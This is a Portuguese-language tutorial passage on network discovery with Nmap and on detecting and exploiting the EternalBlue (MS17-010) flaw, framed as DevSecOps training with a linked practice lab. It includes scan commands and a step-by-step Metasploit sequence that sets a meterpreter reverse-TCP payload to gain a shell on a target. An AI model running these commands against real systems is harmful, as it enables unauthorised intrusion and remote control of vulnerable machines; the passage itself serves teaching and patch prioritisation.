## 🔎 Nmap: A Ferramenta Essencial de Descoberta de Rede

*(... Conteúdo da seção Nmap anterior ...)*

### Exemplos Práticos de Nmap

| Objetivo do Scan | Comando Nmap | Descrição |
| :--- | :--- | :--- |
| Enumeração de Hosts | `nmap -sn 192.168.1.0/24` | Faz um *ping scan* para encontrar todos os dispositivos ativos na sub-rede (o `-sn` desabilita a varredura de portas). |
| Enumeração de Portas e Serviços | `nmap 192.168.1.100` | Varre as 1000 portas TCP mais comuns do *host* e tenta identificar o serviço em execução. |
| Detecção de Serviço e Versão | `nmap -sV 192.168.1.100` | Faz uma sondagem mais aprofundada para determinar o nome e o número da **versão** exata do serviço em execução em cada porta aberta. |
| Detecção de SO | `nmap -O 192.168.1.100` | Tenta determinar o sistema operacional do *host* remoto (ex: Linux Kernel 4.x, Windows Server 2016). |
| Scan Agressivo (Tudo) | `nmap -A 192.168.1.100` | Equivalente a `-sV`, `-O`, *script scanning* (NSE) e *traceroute*. |

-----

## 💣 Ameaças do Mundo Real e Exploração

Após o DAST identificar uma vulnerabilidade e o Nmap mapear um serviço vulnerável, a próxima etapa é a exploração.

### Detecção de EternalBlue com Nmap Scripting Engine (NSE)

O Nmap possui um poderoso sistema de *scripts* chamado **Nmap Scripting Engine (NSE)**, que permite automatizar uma vasta gama de tarefas, incluindo a **detecção específica de vulnerabilidades**.

  * **Módulo de Detecção:** O *script* específico para checar a falha EternalBlue (MS17-010) é o:
      * `smb-vuln-ms17-010`
  * **Comando de Execução:** Para testar um *host* em busca dessa vulnerabilidade, o comando é:
    ```bash
    nmap -p 445 --script smb-vuln-ms17-010 <IP_ALVO>
    ```
  * **Funcionamento:** Este *script* tenta se comunicar com o serviço SMB na porta 445 do *host* alvo e realiza sondagens específicas para determinar se a falha do EternalBlue está presente.
  * **Output:** Se a vulnerabilidade for detectada, o Nmap retornará um alerta claro no *output* do *scan*, confirmando a presença da falha.

### Exploração no Metasploit Framework

Uma vez que a vulnerabilidade é confirmada pelo Nmap, o **Metasploit Framework** (uma plataforma de testes de intrusão) pode ser usado para provar o risco, executando o *exploit* real:

1.  **Seleção do Módulo:** O testador carrega o módulo de *exploit* correspondente à falha MS17-010.
    ```
    msf6 > use exploit/windows/smb/ms17_010_eternalblue
    ```
2.  **Configuração de Opções:** O testador define as opções necessárias, principalmente o *host* alvo (`RHOSTS`) e o *payload* (o código que será executado após a exploração bem-sucedida).
    ```
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS <IP_ALVO>
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
    ```
3.  **Execução:** O Metasploit executa o *exploit*, tentando ganhar acesso de *shell* no sistema alvo.
    ```
    msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
    ```

<!-- end list -->

  * **Resultado:** Se a exploração for bem-sucedida, o testador obterá um *Meterpreter shell* ou um *shell* de comandos no sistema comprometido, demonstrando a gravidade da vulnerabilidade e a necessidade urgente de aplicar o *patch* (a atualização de segurança).
  Você pode praticar aqui (https://tryhackme.com/room/blue)

### Lição DevSecOps

A integração de ferramentas (Nmap para detecção, Metasploit para validação) é vital. Em DevSecOps, o objetivo final é usar essa inteligência para:

1.  **Priorizar:** Concentrar esforços de *patching* e correção nos serviços que o Nmap identifica como vulneráveis (Ex: SMBv1, desatualizado).
2.  **Automatizar:** Integrar varreduras com *scripts* do NSE (como `smb-vuln-ms17-010`) em *scans* periódicos para alertar imediatamente sobre novas exposições.